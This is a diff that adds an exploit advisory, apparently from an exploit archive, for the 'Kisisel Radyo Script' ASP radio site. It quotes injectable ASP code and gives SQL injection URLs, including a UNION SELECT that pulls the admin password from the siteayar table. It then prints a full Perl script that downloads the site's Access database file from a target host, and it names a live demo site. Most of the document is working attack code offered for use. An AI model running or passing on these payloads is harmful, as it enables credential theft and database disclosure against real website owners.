@@ -1,0 +1,83 @@
+Kisisel Radyo Script - Multiple Vulnerabilities
+############################################
+Author: FuRty
+Contact : fir4t@fir4t.org
+Thanks: RedGuard, KnocKout, TrSniper and all Justic3 Group
+############################################
+Script : Kisisel Radyo Script
+Version : N/A
+Download : http://www.aspindir.com
+###########################################
+SQL Injection Vulnerable in radyo.asp
+#################################### 
+              	  id = Request.QueryString("id")
+	  
+	  Set baglanti = Server.CreateObject("Adodb.Connection")
+	  baglanti.Open "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & Server.MapPath(""&veriyolu&"")
+	  
+set rsust=Server.CreateObject("ADODB.RecordSet")
+sql = "Select * from sayfa WHERE id="&id&""
+############################################
+http://VICTIM/path/radyo.asp?Id=2 and 1=1 [True]
+http://VICTIM/path/radyo.asp?Id=2 and 1=0 [False]
+http://VICTIM/path/radyo.asp?Id=2%20union%20select%200,1,adminsifre%20from%20siteayar%20where%20id=1 
+##############################################         
+   Remote Database Disclosure Exploit
+##############################################
+#!/usr/bin/perl -w
+#
+# Kisisel Radyo Script Remote Database Disclosure Exploit
+# Coded: FuRty
+# Thanks: RedGuard, KnocKout, TrSniper and all Justic3 Group
+# Contact : fir4t@fir4t.org
+# Demo: http://www.kardeslermarble.com/radyo/
+ 
+ 
+ 
+use LWP::Simple;
+use LWP::UserAgent;
+
+system('cls');
+system('title Kisisel Radyo Script Remote Database Disclosure Exploit by FuRty');
+system('color 4');
+
+
+if(@ARGV < 2)
+{
+print "[-]Ornegi inceleyin\n\n";
+&help; exit();
+}
+sub help()
+{
+print "[+] usage1 : perl $0 site.com /path/ \n";
+print "[+] usage2 : perl $0 localhost / \n";
+}
+
+print "\n************************************************************************\n";
+print "\* Kisisel Radyo Script Remote Database Disclosure Exploit              *\n";
+print "\* Exploited By : FuRty                                                 *\n";
+print "\* msn :   fir4t@fir4t.org                                              *\n";
+print "\* Thanks: RedGuard,KnocKout, TrSniper and All Justic3 Group                      *\n";
+print "\*********************************************************************\n\n\n";
+
+($TargetIP, $path, $File,) = @ARGV;
+
+$File="sevvo/eco23.mdb";
+my $url = "http://" . $TargetIP . $path . $File;
+print "\n wait!!! \n\n";
+
+my $useragent = LWP::UserAgent->new();
+my $request = $useragent->get($url,":content_file" => "C:/db.mdb");
+
+if ($request->is_success)
+{
+print "[+] $url Exploited!\n\n";
+print "[+] Database saved to C:/db.mdb\n";
+exit();
+}
+else
+{
+print "[!] Exploiting $url Failed !\n[!] ".$request->status_line."\n";
+exit();
+}
+
